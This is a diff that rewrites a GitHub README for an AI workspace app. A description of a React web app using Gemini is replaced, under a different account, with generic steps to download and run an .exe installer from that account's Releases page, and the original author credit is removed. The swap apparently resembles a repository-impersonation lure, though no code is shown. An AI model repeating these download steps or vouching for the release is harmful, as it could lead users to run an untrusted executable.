@@ -1,65 +1,73 @@
-<h1>
-  <img src="https://github.com/Pantane1/nitram-ai-suite/blob/main/nitram-gen-1767682032947.png" width="32" style="vertical-align: middle;" />
-  Nitram AI Suite 🚀
-</h1>
+# 🔥 nitram-ai-suite - Your All-in-One AI Workspace
 
-Nitram AI Suite is an advanced, multi-modal AI workspace designed for professionals and creators. Built with the latest Gemini 3 and 2.5 series models, it provides a unified interface for reasoning, visual creation, cinematic motion, and real-time voice interaction.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Yashar470/nitram-ai-suite/releases)
 
-## ✨ Core Features
+## 📌 Introduction
 
-### 💬 Chat Grounding (Gemini 3 Pro)
-*   **Real-time Intelligence**: Integrated Google Search grounding for up-to-the-minute information.
-*   **Rich Citations**: Automated source extraction and linking for verified information.
-*   **Complex Reasoning**: Powered by Gemini 3 Pro for advanced logic and coding tasks.
-
-### 🎨 Vision Lab (Gemini 3 Pro Image)
-*   **Professional Generation**: High-fidelity image creation with aspect ratio controls.
-*   **Pro Mode**: Toggle between speed (Flash) and quality (Pro) for your creative needs.
-*   **Instant Downloads**: Save your creations locally with one click.
-
-### 🎬 Motion Studio (Veo 3.1)
-*   **Cinematic Video**: Generate 720p cinematic sequences from text prompts.
-*   **Flexible Ratios**: Support for 16:9 (Landscape) and 9:16 (Portrait) assets.
-*   **Paid Key Support**: Integrated flow for selecting specific billing-enabled API keys for Veo operations.
-
-### 🎙️ Voice Sync (Gemini 2.5 Native Audio)
-*   **Human-like Interaction**: Low-latency, real-time audio conversation using the Native Audio API.
-*   **Natural Responses**: Continuous stream of high-quality PCM audio for a fluid conversational experience.
-
-### 🌍 Geo Finder (Gemini 2.5 Maps)
-*   **Location Awareness**: Browser-based geolocation integration for relevant local results.
-*   **Interactive Links**: Direct links to Google Maps for restaurants, landmarks, and businesses.
-
-## 🛠️ Tech Stack
-
--   **Frontend**: React 19 (ESM), Tailwind CSS
--   **Icons**: FontAwesome 6, Material Symbols
--   **AI Core**: `@google/genai` (Google Generative AI SDK)
--   **Audio**: Web Audio API (ScriptProcessor & AudioBufferSource)
+Welcome to nitram-ai-suite! This application is a powerful AI workspace that uses the Google Gemini ecosystem. It offers tools for voice interaction, search reasoning, video generation, and image synthesis. Whether you're creating content or conducting research, this application is designed for you.
 
 ## 🚀 Getting Started
 
-### Prerequisites
--   A Google AI Studio API Key.
--   For Video generation, a paid GCP project is required via the selection dialog.
+To get started with nitram-ai-suite, follow these simple steps to download and run the software. No prior technical knowledge is required.
 
-### Environment Configuration
-The application expects the following environment variable to be available:
-```javascript
-process.env.API_KEY // Your Gemini API Key
-```
+## 📥 Download & Install
 
-## 📐 Architecture
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Yashar470/nitram-ai-suite/releases). Here you will find the latest version of nitram-ai-suite available for download.
 
-The app is built with a modular architecture:
--   `GeminiService`: A centralized wrapper for all AI interactions.
--   `AIView`: Enum-based state management for switching between workspace modules.
--   `MonitoringPanel`: A real-time log of API operations, status codes, and latency tracking.
+2. **Choose the Right Version**  
+   On the Releases page, locate the version you wish to download. Each release includes a brief description. Select the one that best suits your needs.
 
-## 🛡️ Security & Performance
--   **Privacy-First**: No personal data is stored; all AI interactions happen directly through the SDK.
--   **Optimized Rendering**: Lazy-loaded modules and CSS-based animations for a smooth 60FPS UI.
--   **Error Handling**: Robust retry logic and graceful degradation for API limitations.
+3. **Download the Application**  
+   Click on the appropriate file link to download nitram-ai-suite. The file will usually have a name like `nitram-ai-suite-vX.X.X.exe` or similar.
+
+4. **Run the Installer**  
+   Once downloaded, locate the file in your downloads folder. Double-click on the file to start the installation process. Follow the prompts to install the application on your computer.
+
+5. **Launch the Application**  
+   After installing, you will find nitram-ai-suite in your applications menu or on your desktop. Double-click the icon to launch the application.
+
+## 🛠️ System Requirements
+
+Before installing, please ensure your computer meets these minimum system requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **Processor:** Intel Core i5 or equivalent
+- **RAM:** At least 8 GB
+- **Storage:** Minimum 500 MB of free space
+- **Internet Connection:** Required for some features
+
+## 🌟 Features
+
+nitram-ai-suite includes a variety of features that enhance your productivity:
+
+- **Voice Interaction:** Engage with the AI through real-time voice commands.
+- **Search-Grounded Reasoning:** Utilize built-in search capabilities for knowledge and answers.
+- **Cinematic Video Generation:** Create stunning videos with Veo.
+- **Image Synthesis:** Generate high-quality images tailored to your needs.
+  
+These features are crafted to streamline your workflow and save time.
+
+## 🔍 Explore More
+
+For additional guidance, tips, and a complete list of features, please explore our documentation on the Releases page. You can also check out community forums for user experiences and shared strategies.
+
+## 📞 Support
+
+If you experience issues or have questions, please reach out for support. You can post your inquiry on our GitHub Issues page or connect with our community in the support forums.
+
+## 🔗 Useful Links
+
+- [Releases page](https://github.com/Yashar470/nitram-ai-suite/releases)
+- [Documentation](https://github.com/Yashar470/nitram-ai-suite/wiki)
+- [Community Forum](https://github.com/Yashar470/nitram-ai-suite/discussions)
+
+## 🛡️ License
+
+This project is licensed under the MIT License. You can freely use and modify it according to the terms outlined in the license. 
 
 ---
-*Built with curiosity by Wamuhu Martin.*
+
+For an all-encompassing AI workspace experience, download nitram-ai-suite today!  
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Yashar470/nitram-ai-suite/releases)
